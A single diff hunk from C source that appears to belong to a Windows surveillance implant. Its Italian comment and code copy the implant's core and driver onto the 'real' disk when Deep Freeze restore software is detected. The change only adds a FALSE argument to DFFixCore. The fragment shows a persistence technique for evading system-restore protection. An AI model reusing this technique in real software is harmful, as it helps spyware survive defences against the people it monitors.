@@ -1561,7 +1561,7 @@ void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_
 
 		// Se c'e' deep freeze copia il core e il driver sul disco "reale"
 		if (IsDeepFreeze()) {
-			if (DFFixCore(&dev_unhook, (unsigned char *)H4DLLNAME, (unsigned char *)H4_HOME_PATH, (unsigned char *)REGISTRY_KEY_NAME)) {
+			if (DFFixCore(&dev_unhook, (unsigned char *)H4DLLNAME, (unsigned char *)H4_HOME_PATH, (unsigned char *)REGISTRY_KEY_NAME, FALSE)) {
 				PVOID old_value = DisableWow64Fs();
 				DFFixDriver(&dev_unhook, drv_path);
 				RevertWow64Fs(old_value);
